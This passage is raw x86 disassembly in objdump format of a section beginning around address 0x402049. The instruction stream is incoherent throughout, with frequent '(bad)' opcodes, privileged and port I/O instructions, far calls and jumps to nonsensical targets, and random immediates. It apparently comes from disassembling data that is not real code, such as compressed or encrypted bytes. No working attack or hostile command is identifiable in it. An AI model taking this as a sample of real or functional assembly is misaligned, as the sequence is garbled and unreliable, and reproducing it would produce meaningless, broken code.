  402049:	adc    eax,0x19546177
  40204e:	pop    edi
  40204f:	sub    BYTE PTR [esi+eiz*8],ch
  402052:	jno    0x4020c5
  402054:	push   ss
  402055:	fisubr WORD PTR [edi+0x93dbd29]
  40205b:	xor    ebx,DWORD PTR [edi+edx*2]
  40205e:	retf   0x47a4
  402061:	fstp   DWORD PTR [edx+0x2c77c11d]
  402067:	pop    es
  402068:	into   
  402069:	adc    dh,BYTE PTR [ecx-0x75f966e9]
  40206f:	in     eax,0x8d
  402071:	(bad)  
  402072:	jmp    0x288a6389
  402077:	inc    edx
  402078:	(bad)  
  402079:	pusha  
  40207a:	sar    BYTE PTR [eax+0x0],cl
  40207d:	in     eax,dx
  40207e:	in     al,dx
  40207f:	inc    esp
  402080:	jge    0x402032
  402082:	or     BYTE PTR [edi],bh
  402084:	loopne 0x40203c
  402086:	call   FWORD PTR [eax-0x4980a749]
  40208c:	inc    edx
  40208d:	scas   eax,DWORD PTR es:[edi]
  40208e:	retf   0x27ce
  402091:	cdq    
  402092:	pop    ss
  402093:	shl    BYTE PTR [edx],0x98
  402096:	xor    eax,0x89d06ba
  40209b:	mov    ch,0x24
  40209d:	jno    0x4020b3
  40209f:	jmp    0x49c46c27
  4020a4:	fucomip st,st(5)
  4020a7:	ja     0x4020ac
  4020a9:	stc    
  4020aa:	loopne 0x402041
  4020ac:	stc    
  4020ad:	cmp    DWORD PTR [ebp-0x49],0xb7fcb128
  4020b4:	lea    ecx,[edx-0x27826745]
  4020ba:	mov    al,0xa
  4020bc:	aas    
  4020bd:	outs   dx,DWORD PTR ds:[esi]
  4020be:	test   ch,0x51
  4020c1:	lock add eax,0x441ca92
  4020c7:	clc    
  4020c8:	outs   dx,DWORD PTR ds:[esi]
  4020c9:	or     edi,DWORD PTR [eax-0x2f]
  4020cc:	test   ecx,ecx
  4020ce:	push   edi
  4020cf:	loop   0x4020cd
  4020d1:	pop    edi
  4020d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4020d3:	push   esp
  4020d4:	push   es
  4020d5:	push   ss
  4020d6:	call   0xe840:0xc1cfbedc
  4020dd:	push   0xffffffc9
  4020df:	ss in  eax,0x7f
  4020e2:	fstp   TBYTE PTR [eax]
  4020e4:	cmc    
  4020e5:	jmp    0x5ba50a96
  4020ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4020eb:	mov    DWORD PTR [eax-0x7fb9dd],ebp
  4020f1:	jmp    0xb5a16857
  4020f6:	mov    dh,0x5b
  4020f8:	rol    ecx,1
  4020fa:	inc    ebx
  4020fb:	mov    fs,WORD PTR [eax-0x1a598ad2]
  402101:	clc    
  402102:	push   es
  402103:	jge    0x402146
  402105:	pop    ebx
  402106:	shl    edi,cl
  402108:	inc    edi
  402109:	mov    eax,ds:0xa06b02af
  40210e:	ja     0x4020fa
  402110:	fs mov edx,0xc8b14911
  402116:	out    dx,al
  402117:	loope  0x40216f
  402119:	cmp    eax,0xbfe199cd
  40211e:	adc    eax,0xd8cbd1a6
  402123:	test   BYTE PTR cs:[ebp-0x77],bl
  402127:	sbb    eax,0xea014f50
  40212c:	sub    ebp,eax
  40212e:	ficomp DWORD PTR [ecx]
  402130:	iret   
  402131:	inc    eax
  402132:	jae    0x402152
  402134:	lock pop ss
  402136:	retf   0x82cc
  402139:	push   cs
  40213a:	sub    BYTE PTR [edi],bl
  40213c:	xor    al,cl
  40213e:	xchg   esp,eax
  40213f:	xchg   DWORD PTR [esi+0x13],edx
  402142:	mov    bh,0x5f
  402144:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402145:	cld    
  402146:	mov    eax,DWORD PTR [ebp+0x6db62c6e]
  40214c:	in     al,0xd
  40214e:	pop    ecx
  40214f:	cwde   
  402150:	dec    edx
  402151:	scas   al,BYTE PTR es:[edi]
  402152:	ror    DWORD PTR [eax+0x14],0x21
  402156:	adc    BYTE PTR [esi+0x5b],bl
  402159:	jmp    0xda2faa8
  40215e:	lods   al,BYTE PTR ds:[esi]
  40215f:	fs jp  0x402160
  402162:	adc    esp,DWORD PTR [ecx-0x62229595]
  402168:	mov    es,WORD PTR [ecx+0x42]
  40216b:	lods   eax,DWORD PTR ds:[esi]
  40216c:	mov    ch,0x64
  40216e:	js     0x4021a8
  402170:	inc    eax
  402171:	sbb    ecx,edi
  402173:	lea    edx,[edx+0x6e]
  402176:	mov    ah,0x24
  402178:	repz test eax,0x2e875191
  40217e:	mov    dh,0xe8
  402180:	retf   
  402181:	add    eax,0x95033ddd
  402186:	fbld   TBYTE PTR [esp+eiz*2-0x2dc1c231]
  40218d:	jnp    0x4021aa
  40218f:	pushf  
  402190:	jp     0x402127
  402192:	repz or BYTE PTR [ebp+0x577c2b5f],0x92
  40219a:	mov    esp,0x8ffbd35a
  40219f:	in     al,0x0
  4021a1:	xor    BYTE PTR [ebx-0x3283a3ea],0x6a
  4021a8:	repz mov ch,0x8c
  4021ab:	or     bh,BYTE PTR [ebx-0x9]
  4021ae:	stc    
  4021af:	inc    esi
  4021b0:	push   edi
  4021b1:	jns    0x4021ff
  4021b3:	add    al,0xe4
  4021b5:	je     0x40215e
  4021b7:	sub    ch,bh
  4021b9:	dec    esi
  4021ba:	mov    cl,0x64
  4021bc:	dec    ebx
  4021bd:	jmp    0x4021ab
  4021bf:	mov    cx,0xdef3
  4021c3:	imul   edx,DWORD PTR [edx-0x78fd0cd7],0x877f58f2
  4021cd:	iret   
  4021ce:	xor    edi,DWORD PTR [edx-0x4fc6f7a]
  4021d4:	fnstenv [edx]
  4021d6:	dec    edx
  4021d7:	daa    
  4021d8:	je     0x402195
  4021da:	and    al,0x3b
  4021dc:	xor    ch,0xaa
  4021df:	and    esi,edi
  4021e1:	pop    ebx
  4021e2:	bound  edi,QWORD PTR [ebx]
  4021e4:	out    0x27,eax
  4021e6:	mov    esp,0xd91800b7
  4021eb:	loopne 0x402239
  4021ed:	enter  0xc858,0xff
  4021f1:	jae    0x40217e
  4021f3:	pop    ebp
  4021f4:	push   0xb6384f41
  4021f9:	mov    al,0xbc
  4021fb:	lea    esp,[ebp-0x32]
  4021fe:	xchg   BYTE PTR ds:0xa34cf096,cl
  402204:	out    0xa9,al
  402206:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402207:	and    BYTE PTR [ecx],ch
  402209:	xchg   ecx,eax
  40220a:	mov    dh,0xef
  40220c:	dec    ebx
  40220d:	pop    esi
  40220e:	jecxz  0x4021e2
  402210:	sbb    eax,0xee825904
  402215:	stos   DWORD PTR es:[edi],eax
  402216:	ins    BYTE PTR es:[edi],dx
  402217:	push   ss
  402218:	cdq    
  402219:	add    al,0x6d
  40221b:	in     al,0x30
  40221d:	pusha  
  40221e:	mov    ds:0xca437311,eax
  402223:	mov    edi,ebp
  402225:	add    cl,BYTE PTR [eax+0x38167a81]
  40222b:	in     al,0x65
  40222d:	pop    ebp
  40222e:	jns    0x4022a0
  402230:	aas    
  402231:	dec    ebx
  402232:	pop    edi
  402233:	jns    0x40224f
  402235:	clc    
  402236:	ficomp WORD PTR [ebp-0x56802ff7]
  40223c:	(bad)  
  40223d:	fmul   st(3),st
  40223f:	mov    eax,DWORD PTR [ecx+0xa]
  402242:	fidivr DWORD PTR [edx-0x17]
  402245:	lods   eax,DWORD PTR ds:[esi]
  402246:	shr    eax,cl
  402248:	dec    edx
  402249:	js     0x402282
  40224b:	jp     0x402238
  40224d:	mov    ds:0xfc5885d9,al
  402252:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402253:	push   esi
  402254:	xor    ecx,DWORD PTR [edx]
  402256:	inc    esp
  402257:	stos   BYTE PTR es:[edi],al
  402258:	out    0x61,eax
  40225a:	cwde   
  40225b:	or     al,0xbf
  40225d:	xor    al,0xfb
  40225f:	adc    ebp,eax
  402261:	and    al,0x91
  402263:	in     eax,0xce
  402265:	inc    DWORD PTR [esp+edi*1]
  402268:	stc    
  402269:	adc    eax,0x640b0d7e
  40226e:	mov    bh,0x74
  402270:	das    
  402271:	push   es
  402272:	(bad)  
  402273:	pop    esi
  402274:	pop    edx
  402275:	adc    eax,0x5a902d62
  40227a:	sbb    al,0xa8
  40227c:	mov    esi,?
  40227e:	cmp    DWORD PTR [edx-0x3],ecx
  402281:	sub    ch,dl
  402283:	js     0x4022a1
  402285:	inc    esp
  402286:	imul   esi,DWORD PTR [edx],0xffffffa6
  402289:	shr    DWORD PTR [edi+edx*1-0x7],1
  40228d:	mov    fs,esp
  40228f:	aas    
  402290:	gs xchg edi,edi
  402293:	frstor [edi-0x64f3c619]
  402299:	loope  0x402305
  40229b:	aas    
  40229c:	loop   0x4022a9
  40229e:	cmc    
  40229f:	rcl    DWORD PTR [edx+ecx*4],1
  4022a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4022a3:	jl     0x40230a
  4022a5:	or     bh,bh
  4022a7:	and    al,0x8a
  4022a9:	fist   WORD PTR cs:0xb94f7711
  4022b0:	outs   dx,BYTE PTR ds:[esi]
  4022b1:	inc    esi
  4022b2:	or     edx,DWORD PTR [edx+esi*4+0x214696f7]
  4022b9:	loop   0x4022f5
  4022bb:	push   DWORD PTR [eax]
  4022bd:	rcl    DWORD PTR [esi-0xb],1
  4022c0:	outs   dx,DWORD PTR ds:[esi]
  4022c1:	inc    edx
  4022c2:	rcr    DWORD PTR [ecx-0x319eafb9],0xe2
  4022c9:	pop    esi
  4022ca:	ret    
  4022cb:	mov    ds:0xbc92a1e4,al
  4022d0:	xchg   esp,eax
  4022d1:	mov    ebx,DWORD PTR [edi+0x7e]
  4022d4:	push   eax
  4022d5:	aaa    
  4022d6:	repnz push ds
  4022d8:	int    0xf2
  4022da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4022db:	or     DWORD PTR [ebx-0x20ff25fc],0xff70c5f0
  4022e5:	mov    eax,0xa0939a12
  4022ea:	fisubr DWORD PTR [edx+edi*1]
  4022ed:	shl    BYTE PTR [edx+0x3f],1
  4022f0:	push   esp
  4022f1:	into   
  4022f2:	dec    ecx
  4022f3:	fmul   DWORD PTR [ebp-0x1]
  4022f6:	dec    ecx
  4022f7:	fcom   DWORD PTR [esp+ebx*2-0x4f]
  4022fb:	xor    dh,al
  4022fd:	sub    BYTE PTR ds:0xe263ea99,0xf0
  402304:	dec    ecx
  402305:	imul   esi,DWORD PTR ds:[edi+0x1b7fc910],0xffffff84
  40230d:	rcl    dh,1
  40230f:	sub    al,0xaf
  402311:	leave  
  402312:	push   edi
  402313:	pop    ebx
  402314:	xor    al,bh
  402316:	push   es
  402317:	popf   
  402318:	jae    0x402396
  40231a:	adc    DWORD PTR ds:0xa2c3037f,ebx
  402320:	out    0x48,eax
  402322:	mov    BYTE PTR [edx],bh
  402324:	out    0x72,al
  402326:	std    
  402327:	sti    
  402328:	fbld   TBYTE PTR [esi-0x7f07696a]
  40232e:	test   eax,0x7c98757d
  402333:	imul   ecx,DWORD PTR [edi],0x79
  402336:	pop    esi
  402337:	sbb    eax,DWORD PTR [edi-0x3d]
  40233a:	mov    bh,0xc4
  40233c:	inc    ecx
  40233e:	sub    bl,BYTE PTR [ebx+0x2d]
  402341:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402342:	dec    esp
  402343:	push   edi
  402344:	loop   0x4022f7
  402346:	mov    bl,0x6a
  402348:	lock jns 0x40236f
  40234b:	xor    dh,bh
  40234d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40234e:	xor    eax,0xe25d9eb2
  402353:	jge    0x402399
  402355:	wbinvd 
  402357:	inc    ebp
  402358:	hlt    
  402359:	pushf  
  40235a:	es jmp 0xe89c:0xd3128852
  402362:	jmp    0xe3a:0x7020b1c1
  402369:	and    ebx,DWORD PTR [eax+0x3e9014]
  40236f:	adc    eax,0x70e31291
  402374:	iret   
  402375:	mov    esi,ebx
  402377:	bnd jo 0x402300
  40237a:	mov    al,0x67
  40237c:	mov    ah,0xc2
  40237e:	aam    0xc8
  402380:	or     esp,ebx
  402382:	jnp    0x4023a5
  402384:	ins    DWORD PTR es:[edi],dx
  402385:	push   ebp
  402386:	and    BYTE PTR [esi-0x5798908c],dl
  40238c:	std    
  40238d:	push   edi
  40238e:	adc    ecx,DWORD PTR [esi-0x1f08af3d]
  402394:	sbb    DWORD PTR [ebx-0x308e379d],0x2b
  40239b:	sbb    esp,DWORD PTR [edx+0x3eb48b9a]
  4023a1:	jp     0x4023d0
  4023a3:	cmp    eax,DWORD PTR [esi]
  4023a5:	daa    
  4023a6:	push   edi
  4023a7:	ret    0xeb1
  4023aa:	iret   
  4023ab:	add    eax,0x653cad6c
  4023b0:	retf   
  4023b1:	fsub   st(3),st
  4023b3:	cld    
  4023b4:	in     eax,dx
  4023b5:	xor    esp,DWORD PTR [edx+eiz*1-0x352a7ade]
  4023bc:	mov    ds:0xce00d281,al
  4023c1:	inc    ebp
  4023c2:	or     dl,cl
  4023c4:	js     0x402417
  4023c6:	xchg   BYTE PTR [eax],ch
  4023c8:	mov    ecx,edi
  4023ca:	cmp    BYTE PTR [eax+0x5f],al
  4023cd:	leave  
  4023ce:	mov    esi,0x4b6ddafb
  4023d3:	enter  0xf615,0x74
  4023d7:	daa    
  4023d8:	js     0x402411
  4023da:	mov    bl,0x1f
  4023dc:	lock retf 
  4023de:	fldcw  WORD PTR [ebp+0x6b4c48a1]
  4023e4:	jbe    0x4023d9
  4023e6:	(bad)  
  4023e7:	into   
  4023e8:	inc    ecx
  4023e9:	push   ss
  4023ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4023eb:	retf   0xb364
  4023ee:	xor    al,0x5c
  4023f0:	pop    ecx
  4023f1:	ins    BYTE PTR es:[edi],dx
  4023f2:	pop    ss
  4023f3:	pop    ebp
  4023f4:	xor    edx,ecx
  4023f6:	fld    DWORD PTR [edi]
  4023f8:	call   DWORD PTR [eax+ebx*1-0x2c]
  4023fc:	hlt    
  4023fd:	and    bl,al
  4023ff:	cmp    DWORD PTR [edi-0x1d7bbf77],esp
  402405:	pop    ds
  402406:	outs   dx,BYTE PTR ds:[esi]
  402407:	mov    edx,0x3552283c
  40240c:	or     esp,ebx
  40240e:	data16 loopne 0x4023e3
  402411:	mov    ah,0xde
  402413:	add    dl,BYTE PTR [eax+edx*1+0x18]
  402417:	scas   eax,DWORD PTR es:[edi]
  402418:	push   ebx
  402419:	mov    ebx,0x830030f1
  40241e:	call   0x124b:0x9725462b
  402425:	fist   WORD PTR [edi-0x59]
  402428:	test   BYTE PTR [eax-0xc3bf9a5],cl
  40242e:	cmp    al,0xa4
  402430:	std    
  402431:	ss mov bh,0x47
  402434:	push   ecx
  402435:	cmp    eax,0x826613af
  40243a:	in     eax,0xed
  40243c:	cmp    al,0x10
  40243e:	lock jb 0x402430
  402441:	mov    ds:0xe394ab13,al
  402446:	mov    bh,0x41
  402448:	adc    eax,0x13638d81
  40244d:	inc    esp
  40244e:	fcom   QWORD PTR [esi-0x5d]
  402451:	sbb    ecx,ebp
  402453:	cmp    al,0xc4
  402455:	xchg   edi,eax
  402456:	xchg   esi,eax
  402457:	jecxz  0x402415
  402459:	stc    
  40245a:	and    eax,0x9b9f3dd9
  40245f:	pop    edx
  402460:	or     DWORD PTR [ebx+0x7e],0xffffffae
  402464:	push   0x84325444
  402469:	adc    DWORD PTR [ebx],edx
  40246b:	mov    dl,0x27
  40246d:	inc    eax
  40246e:	imul   eax,DWORD PTR [bp+di],0xffffffd7
  402472:	jecxz  0x4024f3
  402474:	(bad)  
  402475:	jp     0x40249e
  402477:	and    eax,0x81c8183e
  40247c:	cmp    BYTE PTR [eax],bl
  40247e:	pop    es
  40247f:	cmp    eax,0x7a4ebccd
  402484:	lahf   
  402485:	sahf   
  402486:	pop    bp
  402488:	test   bh,dl
  40248a:	aad    0x2
  40248c:	stos   BYTE PTR es:[edi],al
  40248d:	adc    eax,DWORD PTR [edi]
  40248f:	add    bl,dl
  402491:	fs mov ecx,0xc83f5cc3
  402497:	sub    al,0x2c
  402499:	stos   DWORD PTR es:[edi],eax
  40249a:	mov    edi,0x9e7f1146
  40249f:	scas   al,BYTE PTR es:[edi]
  4024a0:	mov    edi,0xfc519157
  4024a5:	int    0x29
  4024a7:	mov    bh,0x47
  4024a9:	push   ebx
  4024aa:	cld    
  4024ab:	jno    0x4024f7
  4024ad:	push   esi
  4024ae:	mov    ebx,0xc114c07a
  4024b3:	add    al,0x18
  4024b5:	inc    esi
  4024b6:	inc    ebp
  4024b7:	and    DWORD PTR [esi-0x75],edx
  4024ba:	or     edx,ebp
  4024bc:	gs in  al,0xab
  4024bf:	pop    ebx
  4024c0:	fsubrp st(5),st
  4024c2:	enter  0x7d13,0x7d
  4024c6:	push   ebx
  4024c7:	sti    
  4024c8:	test   eax,0xdcabcb0
  4024cd:	adc    BYTE PTR [ecx+0x0],0x3d
  4024d1:	out    dx,eax
  4024d2:	push   cs
  4024d3:	add    dh,BYTE PTR [ecx+ebp*1-0x444e23aa]
  4024da:	jmp    0xc75aefd3
  4024df:	into   
  4024e0:	dec    esp
  4024e1:	push   edi
  4024e2:	imul   edi,DWORD PTR [edi+0x32744d25],0xffffffa0
  4024e9:	aas    
  4024ea:	je     0x40255c
  4024ec:	jno    0x4024ad
  4024ee:	ss stos DWORD PTR es:[edi],eax
  4024f0:	test   edi,esp
  4024f2:	push   ecx
  4024f3:	je     0x4024c5
  4024f5:	arpl   WORD PTR [edx+0x2368c5bc],ax
  4024fb:	xor    DWORD PTR [ecx+0x3d],ecx
  4024fe:	cmp    DWORD PTR [eax],0xffffffdb
  402501:	popa   
  402502:	xchg   esi,eax
  402503:	mov    esp,0x73d5a9af
  402508:	fdiv   st(6),st
  40250a:	jo     0x40253f
  40250c:	adc    al,0x17
  40250e:	outs   dx,DWORD PTR ds:[esi]
  40250f:	push   ebx
  402510:	jge    0x4024dc
  402512:	call   0x862b:0x36a611bf
  402519:	or     edi,DWORD PTR [esi+0x70]
  40251c:	pusha  
  40251d:	ds dec esp
  40251f:	add    eax,0xfffffff5
  402522:	add    edi,DWORD PTR [ebp+0x4d]
  402525:	out    0xbe,eax
  402527:	inc    eax
  402528:	add    BYTE PTR [eax-0x3b4ef557],dh
  40252e:	sbb    al,BYTE PTR [esi-0x79cacfe9]
  402534:	outs   dx,BYTE PTR ds:[esi]
  402535:	inc    edx
  402536:	cli    
  402537:	mov    eax,0x5a27f9c8
  40253c:	cdq    
  40253d:	sub    esi,DWORD PTR [esi+edx*2]
  402540:	repnz dec edi
  402542:	pop    esp
  402543:	push   0x34f99963
  402548:	sub    eax,0x406ccfe9
  40254d:	ret    0xacf8
  402550:	add    eax,0xac6db14e
  402555:	push   esp
  402556:	mov    esp,esi
  402558:	push   cs
  402559:	and    dh,BYTE PTR [ecx+eax*4]
  40255c:	aaa    
  40255d:	cmp    al,0x7c
  40255f:	xor    bh,BYTE PTR [eax+0x79]
  402562:	(bad)  
  402563:	loopne 0x402582
  402565:	out    dx,al
  402566:	mov    esi,DWORD PTR [edi-0x5507d8ad]
  40256c:	and    DWORD PTR [eax+0x39],esp
  40256f:	inc    ecx
  402570:	xor    DWORD PTR ds:0x275a6b49,ebp
  402576:	xor    bh,dh
  402578:	idiv   BYTE PTR [edx-0x2fcecc2]
  40257e:	jne    0x4025eb
  402580:	repz (bad) 
  402582:	sub    dl,ch
  402584:	out    dx,al
  402585:	mov    ebp,0xdf526af0
  40258a:	out    0x6b,eax
  40258c:	dec    ax
  40258e:	fs push ebx
  402590:	(bad)  
  402591:	bound  ebx,QWORD PTR [ebp-0x38]
  402594:	sub    al,0x68
  402596:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402597:	sub    eax,0x75a9fa07
  40259c:	mov    edx,0xe7aad04d
  4025a1:	and    al,0x2b
  4025a3:	inc    ebp
  4025a4:	dec    ecx
  4025a5:	jb     0x4025f9
  4025a7:	pushf  
  4025a8:	lock mov edx,eax
  4025ab:	and    dh,BYTE PTR [edi+0x17]
  4025ae:	sbb    eax,DWORD PTR [edx+0x3180b00d]
  4025b4:	add    dl,BYTE PTR [ebx-0x4a0f555e]
  4025ba:	and    BYTE PTR [edi],dl
  4025bc:	mov    eax,0xce479203
  4025c1:	sar    ecx,0xd3
  4025c4:	lea    esi,[ebx]
  4025c6:	scas   eax,DWORD PTR es:[edi]
  4025c7:	and    al,0x67
  4025c9:	push   edx
  4025ca:	jne    0x402560
  4025cc:	popa   
  4025cd:	mov    ebx,0x628764d5
  4025d2:	adc    eax,esp
  4025d4:	push   ds
  4025d5:	out    dx,al
  4025d6:	repnz icebp 
  4025d8:	sub    al,0xbb
  4025da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4025db:	inc    esi
  4025dc:	adc    DWORD PTR [ebp-0x70],eax
  4025df:	out    dx,al
  4025e0:	aaa    
  4025e1:	lahf   
  4025e2:	add    al,0xc9
  4025e4:	xchg   ebx,eax
  4025e5:	or     esi,DWORD PTR [eax-0x48]
  4025e8:	div    BYTE PTR [edi+0x3899c625]
  4025ee:	shl    DWORD PTR [edx],cl
  4025f0:	xchg   ebx,eax
  4025f1:	pop    ebx
  4025f2:	fs pushf 
  4025f4:	mov    BYTE PTR [esi+0x23],dh
  4025f7:	xchg   ebx,eax
  4025f8:	nop
  4025f9:	mov    dl,0x69
  4025fb:	daa    
  4025fc:	xlat   BYTE PTR ds:[ebx]
  4025fd:	mov    eax,ds:0xfe203f00
  402602:	mov    edx,0x3e5a5a97
  402607:	in     eax,0x8
  402609:	and    dl,BYTE PTR [eax+0x484e57c4]
  40260f:	add    edx,DWORD PTR [ebx-0x71]
  402612:	adc    dh,BYTE PTR [ebp-0xc20a837]
  402618:	fist   WORD PTR [edi+esi*2-0x56]
  40261c:	fstp   TBYTE PTR [edi+0x71]
  40261f:	mov    eax,ds:0x2c16d1f5
  402625:	stos   BYTE PTR es:[edi],al
  402626:	test   BYTE PTR [eax-0x4e],dh
  402629:	test   al,0x4d
  40262b:	cli    
  40262c:	shl    ecx,0x6a
  40262f:	xchg   esp,eax
  402630:	call   0x9999:0x7c4b9113
  402637:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402639:	jne    0x4025da
  40263b:	mov    ah,0xb5
  40263d:	inc    esi
  40263e:	adc    DWORD PTR [eax+0x2567be7],0x775fff6b
  402648:	jmp    0x5dfdd8b5
  40264d:	adc    al,BYTE PTR [ebx+0x7c]
  402650:	push   edx
  402651:	loope  0x40265d
  402653:	push   ds
  402654:	fwait
  402655:	in     al,dx
  402656:	or     al,0x2d
  402658:	inc    ebp
  402659:	cmc    
  40265a:	inc    edi
  40265b:	test   eax,0x1726fc42
  402660:	lock jno 0x402650
  402663:	mov    ah,0xb6
  402665:	mov    eax,0xecbec4dc
  40266a:	fidiv  WORD PTR [ebx+ecx*1-0x6d]
  40266e:	add    cl,cl
  402670:	push   edx
  402671:	leave  
  402672:	outs   dx,BYTE PTR ds:[esi]
  402673:	jl     0x40263d
  402675:	(bad)  
  402676:	xchg   edi,eax
  402677:	xor    BYTE PTR [edi],0xed
  40267a:	leave  
  40267b:	int    0x52
  40267d:	loope  0x402683
  40267f:	xchg   cl,dh
  402681:	inc    esi
  402682:	mov    dh,0x7
  402684:	(bad)
  402688:	movaps xmm2,XMMWORD PTR ds:0xe4a7681c
  40268f:	imul   ebp,DWORD PTR [eax-0x4a58cf96],0xffffffa6
  402696:	test   eax,0xf6f3c865
  40269b:	and    al,0x33
  40269d:	xor    DWORD PTR [ecx-0x3f],esi
  4026a0:	jb     0x402662
  4026a2:	fmulp  st(2),st
  4026a4:	repnz aaa 
  4026a6:	es cdq 
  4026a8:	stos   BYTE PTR es:[edi],al
  4026a9:	adc    cl,dh
  4026ab:	daa    
  4026ac:	pop    eax
  4026ad:	jae    0x40267f
  4026af:	js     0x4026cb
  4026b1:	pop    edi
  4026b2:	retf   
  4026b3:	pusha  
  4026b4:	addr16 mov ds:0x4f65,eax
  4026b8:	inc    esp
  4026b9:	and    ebp,esp
  4026bb:	xlat   BYTE PTR ds:[ebx]
  4026bc:	xor    al,dl
  4026be:	push   esp
  4026bf:	imul   ecx,esi,0x1958779f
  4026c5:	iret   
  4026c6:	in     eax,0x95
  4026c8:	add    al,0x99
  4026ca:	fwait
  4026cb:	mov    ebp,0x56dab443
  4026d0:	cli    
  4026d1:	inc    esp
  4026d2:	lods   eax,DWORD PTR ds:[esi]
  4026d3:	fcom   DWORD PTR [ebx+0x73]
  4026d6:	loope  0x40270d
  4026d8:	xchg   esp,eax
  4026d9:	into   
  4026da:	mov    bl,0x6c
  4026dc:	imul   esi,DWORD PTR [ecx+ecx*8-0x7f],0xce7eb5f2
  4026e4:	test   DWORD PTR [ecx+eiz*4],esp
  4026e7:	mov    al,0x50
  4026e9:	jecxz  0x402682
  4026eb:	mov    edx,0x527fe171
  4026f0:	xchg   edi,eax
  4026f1:	iret   
  4026f2:	ror    DWORD PTR [ebx-0x52],0x27
  4026f6:	outs   dx,BYTE PTR ds:[esi]
  4026f7:	pop    eax
  4026f8:	(bad)  
  4026f9:	call   0xabd1:0x5a0d78d8
  402700:	jae    0x402772
  402702:	repz jno 0x40275f
  402705:	mov    ch,ch
  402707:	pop    eax
  402708:	in     eax,0x3
  40270a:	ss and edx,edx
  40270d:	push   0xdb1b78d9
  402712:	pop    esi
  402713:	push   ds
  402714:	pop    ds
  402715:	inc    edi
  402716:	cmc    
  402717:	push   ds
  402718:	cmp    DWORD PTR [ebx-0x50],ecx
  40271b:	sti    
  40271c:	adc    BYTE PTR ds:0x299583f1,ch
  402722:	push   es
  402723:	dec    ecx
  402724:	xlat   BYTE PTR ds:[ebx]
  402725:	xchg   ebx,eax
  402726:	dec    ecx
  402727:	pushf  
  402728:	adc    dh,BYTE PTR [eiz*1-0x6909f0e5]
  40272f:	retf   0x303e
  402732:	jecxz  0x402740
  402734:	test   eax,edx
  402736:	aas    
  402737:	mov    DWORD PTR [esi],ecx
  402739:	inc    esi
  40273a:	sub    al,0x46
  40273c:	gs into 
  40273e:	inc    ebp
  40273f:	and    dl,ah
  402741:	dec    ebx
  402742:	or     esp,ebp
  402744:	ins    DWORD PTR es:[edi],dx
  402745:	dec    edi
  402746:	js     0x40277e
  402748:	out    dx,eax
  402749:	ficomp WORD PTR [eax+0x7e732c71]
  40274f:	push   0x6
  402751:	push   cs
  402752:	add    ah,bl
  402754:	xor    al,0x0
  402756:	int3   
  402757:	clc    
  402758:	pop    eax
  402759:	jo     0x4027d5
  40275b:	lods   eax,DWORD PTR ds:[esi]
  40275c:	or     ebp,0x4a6d8834
  402762:	test   eax,0x630949d8
  402767:	scas   al,BYTE PTR es:[edi]
  402768:	push   eax
  402769:	lods   al,BYTE PTR ds:[esi]
  40276a:	sbb    DWORD PTR [eax+ecx*4+0x67],eax
  40276e:	dec    edi
  40276f:	and    edi,DWORD PTR [ebx+0x74a565a0]
  402775:	jge    0x4027cb
  402777:	(bad)  
  402778:	(bad)  
  40277a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40277b:	int    0x95
  40277d:	dec    esp
  40277e:	push   ss
  40277f:	sbb    DWORD PTR [esp+edx*2],edi
  402782:	dec    ecx
  402783:	dec    ecx
  402784:	mov    edi,ebp
  402786:	out    0x5,al
  402788:	push   edx
  402789:	sub    ebx,DWORD PTR [ebp-0x12]
  40278c:	xor    bl,ch
  40278e:	int3   
  40278f:	in     al,0xa4
  402791:	sub    ch,0x5c
  402794:	sub    al,0xb0
  402796:	xchg   BYTE PTR [edi-0x364f6fe3],ah
  40279c:	or     DWORD PTR [ebp-0x6d1fb976],esp
  4027a2:	push   ebx
  4027a3:	xor    BYTE PTR ds:0x473c5b8d,al
  4027a9:	or     DWORD PTR [eax-0x39],esi
  4027ac:	push   cs
  4027ad:	mov    cl,0x57
  4027af:	cdq    
  4027b0:	(bad)  
  4027b1:	and    edi,esi
  4027b3:	pop    ebp
  4027b4:	mov    edi,0x7f0e6456
  4027b9:	xchg   DWORD PTR [ebx+0x15],eax
  4027bc:	jecxz  0x4027b2
  4027be:	(bad)  
  4027bf:	mov    eax,ds:0xb2222aee
  4027c4:	shl    DWORD PTR [esi+0x0],1
  4027c7:	adc    ah,BYTE PTR [edi+0x9]
  4027ca:	pop    eax
  4027cc:	mov    bl,0x4
  4027ce:	pop    edx
  4027cf:	jle    0x4027c5
  4027d1:	std    
  4027d2:	lods   eax,DWORD PTR ds:[esi]
  4027d3:	add    BYTE PTR [esi-0x4e],ah
  4027d6:	cdq    
  4027d7:	pop    edx
  4027d8:	mov    ebx,0x1c781323
  4027dd:	jge    0x4027f8
  4027df:	push   esp
  4027e0:	dec    ebp
  4027e1:	cmp    eax,0x505faccf
  4027e6:	loopne 0x4027bf
  4027e8:	nop
  4027e9:	mov    ds:0x1c85225d,eax
  4027ee:	inc    edx
  4027ef:	mov    ebp,gs
  4027f1:	(bad)  
  4027f2:	repz arpl WORD PTR [edx-0x4216247c],si
  4027f9:	and    BYTE PTR [esi-0x479baba0],0xf3
  402800:	mov    ecx,eax
  402802:	or     al,BYTE PTR ds:0x4a259c6a
  402808:	xor    eax,0x771c4b81
  40280d:	rol    ebp,1
  40280f:	dec    ebp
  402810:	mov    eax,ds:0x9192491a
  402815:	loop   0x402881
  402817:	repnz (bad) 
  402819:	xor    bh,BYTE PTR [ecx-0x147b61a9]
  40281f:	retf   0xbe72
  402822:	test   DWORD PTR [eax-0x21f4bb53],esi
  402828:	lahf   
  402829:	pop    esi
  40282a:	dec    esp
  40282b:	adc    al,0xd0
  40282d:	sub    DWORD PTR [edx],esp
  40282f:	dec    esi
  402830:	cs push ss
  402832:	cmp    dl,BYTE PTR [ebp+0x61]
